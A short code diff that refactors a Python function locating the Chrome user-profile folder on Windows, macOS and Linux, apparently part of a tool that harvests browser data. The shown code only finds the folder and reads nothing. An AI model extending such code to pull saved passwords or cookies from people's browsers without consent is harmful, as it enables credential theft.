@@ -6,15 +6,15 @@ import os,sys
 def get_chrome_path():
     if win_client():
         PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
-        if (os.path.isdir(PathName) == False):
+        if not (os.path.isdir(PathName)):
             return "[!] Chrome Doesn't exists", False
     if osx_client():
         PathName = os.getenv('HOME') + "/Library/Application Support/Google/Chrome/Default/"
-        if (os.path.isdir(PathName) == False):
+        if not (os.path.isdir(PathName)):
             return "[!] Chrome Doesn't exists", False
     if lnx_client():
         PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
-        if (os.path.isdir(PathName) == False):
+        if not (os.path.isdir(PathName)):
             return "[!] Chrome Doesn't exists", False
     return PathName, True
 
